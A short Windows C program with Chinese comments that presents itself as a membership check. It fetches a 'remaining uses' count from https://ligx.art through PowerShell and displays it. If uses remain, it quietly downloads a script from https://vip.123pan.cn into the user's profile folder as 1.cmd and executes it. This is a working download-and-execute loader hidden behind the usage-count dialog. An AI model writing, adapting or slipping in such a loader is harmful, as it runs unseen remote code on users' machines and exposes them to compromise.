#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    // 读取URL中的数据
    const char *url = "https://ligx.art";
    const char *cmd = "powershell -Command ";
    char powershellCmd[256];
    sprintf(powershellCmd, "%s \"(Invoke-WebRequest -Uri '%s' -UseBasicParsing).Content\"", cmd, url);

    FILE *fp = popen(powershellCmd, "r");
    if (!fp) {
        MessageBox(NULL, "Failed to execute PowerShell command", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // 解析数据中的数字
    char countStr[64];
    int count = 0;

    while (fgets(countStr, sizeof(countStr), fp)) {
        char *countStart = strstr(countStr, "\"count\":");
        if (countStart) {
            countStart += strlen("\"count\":");
            count = atoi(countStart);
            break;
        }
    }

    pclose(fp);

    // 显示剩余可打开次数
    char countMsg[256];
    sprintf(countMsg, "云端剩余次数：%d", count);
    MessageBox(NULL, countMsg, "会员提醒", MB_OK);

    // 判断是否需要关闭程序
    if (count == 0) {
        MessageBox(NULL, "次数已用尽，程序即将关闭", "会员提醒", MB_OK);
        exit(0);
    } else {
        // 下载文件到USERPROFILE，并命名为1.cmd
        const char *fileUrl = "https://vip.123pan.cn";
        const char *fileName = "1.cmd";
        const char *outputPath = getenv("USERPROFILE");
        char downloadCmd[256];
        sprintf(downloadCmd, "%s \"(Invoke-WebRequest -Uri '%s' -OutFile '%s\\%s')\"", cmd, fileUrl, outputPath, fileName);
        system(downloadCmd);

        // 运行下载的文件
        char runCmd[256];
        sprintf(runCmd, "\"%s\\%s\"", outputPath, fileName);
        system(runCmd);
    }

    return 0;
}
